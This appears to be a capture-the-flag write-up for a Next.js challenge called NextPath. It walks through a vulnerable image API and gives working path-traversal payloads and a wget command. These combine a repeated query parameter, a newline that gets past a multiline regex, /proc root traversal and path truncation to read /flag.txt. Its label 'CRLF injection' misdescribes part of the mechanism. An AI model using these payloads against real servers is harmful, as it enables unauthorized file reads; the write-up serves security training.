# NextPath Challenge Exploitation

## Key Information

### Docker Configuration

The Docker file reveals the location of the flag:

```dockerfile
COPY flag.txt /flag.txt
```

### Application Framework

The web application is built using **Next.js**, as identified from `package.json`:

```json
{
  "name": "nextpath",
  "version": "0.1.0",
  "private": true,
  "scripts": {
    "dev": "next dev",
    "build": "next build",
    "start": "next start",
    "lint": "next lint"
  },
  "dependencies": {
    "eslint": "8.42.0",
    "eslint-config-next": "13.4.5",
    "fs": "^0.0.1-security",
    "next": "13.4.5",
    "react": "18.2.0",
    "react-dom": "18.2.0"
  }
}
```

### Key Endpoint

The `index.js` file in `app/pages` includes a call to the `/api/team` API:

```js
{/* Team Section */}
<section className="team">
  <div className="container">
    <h2 className="text-center mb-4">Meet Our Team</h2>
    <div className="row">
      <div className="col-md-4">
        <div className="team-member">
          <img src="/api/team?id=1" alt="Team Member 1" />
          <h4>John Doe</h4>
          <p>Founder/CEO</p>
        </div>
      </div>
    </div>
  </div>
</section>
```

This API fetches image data for team members using an `id` parameter.

---

## API Vulnerability Analysis

### Code Breakdown (`team.js`)

The handler function for `/api/team` contains potential vulnerabilities:

```js
import path from 'path';
import fs from 'fs';

const ID_REGEX = /^[0-9]+$/m;

export default function handler({ query }, res) {
  if (!query.id) {
    res.status(400).end("Missing id parameter");
    return;
  }

  if (!ID_REGEX.test(query.id)) {
    console.error("Invalid format:", query.id);
    res.status(400).end("Invalid format");
    return;
  }

  if (query.id.includes("/") || query.id.includes("..")) {
    console.error("DIRECTORY TRAVERSAL DETECTED:", query.id);
    res.status(400).end("DIRECTORY TRAVERSAL DETECTED?!? This incident will be reported.");
    return;
  }

  try {
    const filepath = path.join("team", query.id + ".png");
    const content = fs.readFileSync(filepath.slice(0, 100));

    res.setHeader("Content-Type", "image/png");
    res.status(200).end(content);
  } catch (e) {
    console.error("Not Found", e.toString());
    res.status(404).end(e.toString());
  }
}
```

#### Input Validation

1. **Regex Check**: Validates that `id` contains only numeric values.
2. **Directory Traversal Check**: Explicitly blocks `/` and `..` sequences.

#### File Access

- Constructs the file path with `.png` appended to `id`.
- Uses `slice(0, 100)` to limit the read length of the file.

---

## Exploitation Steps

### 1. Bypassing Validation

#### CRLF Injection

The input validation filters for numeric values and directory traversal characters. However, CRLF (`%0D%0A`) can be used to inject additional parameters into the query.

**Payload**:

```http
http://<target>/api/team?id=1%0D%0A
```

#### Array Manipulation

By sending an additional `id` parameter, the `query.id` becomes an array, bypassing single-value checks.

**Payload**:

```http
http://<target>/api/team?id=1%0D%0A&id=/path/file
```

---

### 2. Path Length Manipulation

The `.png` extension is appended to `id` before slicing the path to 100 characters. By providing a sufficiently long path, we can bypass the extension by truncating it.

**Payload**:

```http
http://<target>/api/team?id=1%0A&id=/../../../../../../../../../../../../../../../../../../../../proc/1/task/1/root/proc/1/task/1/root/flag.txt
```

---

### 3. Retrieving the Flag

Use `wget` to fetch the flag using the crafted payload:

```bash
wget -O output "http://<target>/api/team?id=1%0A&id=/../../../../../../../../../../../../../../../../../../../../proc/1/task/1/root/proc/1/task/1/root/flag.txt"
```

**Output**:

```bash
HTB{tr4v3r51ng_p45t_411_th3_ch3ck5...t4sk_w3ll_d0ne!}
```

---

## Achieved Skills

1. **CRLF Injection**: Understanding how CRLF sequences can bypass input validation.
2. **Local File Inclusion (LFI)**: Techniques for bypassing filters to read sensitive files.
3. **Path Manipulation**: Exploiting truncation logic to bypass security mechanisms.
